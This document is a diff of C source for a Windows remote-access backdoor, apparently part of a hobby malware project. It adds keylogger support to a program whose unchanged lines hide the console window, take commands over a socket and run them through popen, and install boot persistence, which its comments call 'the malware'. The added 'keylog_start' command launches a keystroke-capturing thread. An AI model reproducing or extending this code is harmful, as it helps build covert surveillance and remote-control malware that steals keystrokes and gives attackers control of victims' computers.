@@ -9,6 +9,8 @@
 #include <string.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+//Inlcude keylogger library
+#include "keylogger.h"
 
 #define bzero(p,size) (void) memset((p), 0, (size))
 
@@ -75,7 +77,6 @@ str_cut(char str[], int slice_from, int slice_to){
 	return buffer;
 }
 
-//Create shell and store the commands and resonses in buffers
 void Shell(){
 	char buffer[1024];
 	char container[1024];
@@ -87,7 +88,7 @@ void Shell(){
 		bzero(container, sizeof(container));
 		bzero(total_response, sizeof(total_response));
 		recv(sock,buffer,1024,0);
-		//Close the socket and terminate Winsock 
+		
 		if(strncmp("q",buffer,1)==0){
 			closesocket(sock);
 			WSACleanup();
@@ -97,6 +98,10 @@ void Shell(){
 			chdir(str_cut(buffer,3,100)); //Change directory by removing cd part.
 		}else if(strncmp("persist", buffer, 7) == 0){
 			bootRun(); //Run the malware in  every boot.	
+		}else if(strncmp("keylog_start", buffer, 12)==0){
+			//Create a thread to run keylogger seperately from the command side
+			HANDLE thread = CreateThread(NULL, 0,logg, NULL, 0, NULL);
+			goto jump;
 		}else{
 			FILE *fp;
 			fp=popen(buffer, "r");
@@ -109,8 +114,8 @@ void Shell(){
 	}
 }
 
-int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmfLine, int nCmdShow){
-    //Hide the console by creating stealth mode
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
+    //Hide the console
     HWND stealth;
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
@@ -129,7 +134,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmfLine, int 
 	if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0 ){
 		exit(1);
 	}
-	// Provide connection-oriented byte stream by using AF_INET address family
 	sock=socket(AF_INET, SOCK_STREAM,0);
 
 	memset(&ServAddr, 0 ,sizeof(ServAddr));
